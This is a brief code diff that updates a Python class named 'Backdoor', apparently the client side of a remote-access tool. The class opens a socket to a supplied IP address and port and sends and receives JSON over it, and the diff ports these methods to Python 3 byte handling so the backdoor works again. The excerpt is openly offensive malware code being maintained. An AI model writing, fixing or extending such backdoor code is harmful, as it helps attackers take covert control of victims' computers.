@@ -14,12 +14,14 @@ class Backdoor:
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip_addr, port))
 
-    def reliable_send(self, data):
+    def reliable_send(self, data: str):
+        if isinstance(data, bytes):
+            data = data.decode()
         json_data = json.dumps(data)
-        self.connection.send(json_data)
+        self.connection.send(json_data.encode())
 
     def reliable_receive(self):
-        json_data = ""
+        json_data = b""
         while True:
             try:
                 json_data += self.connection.recv(1024)
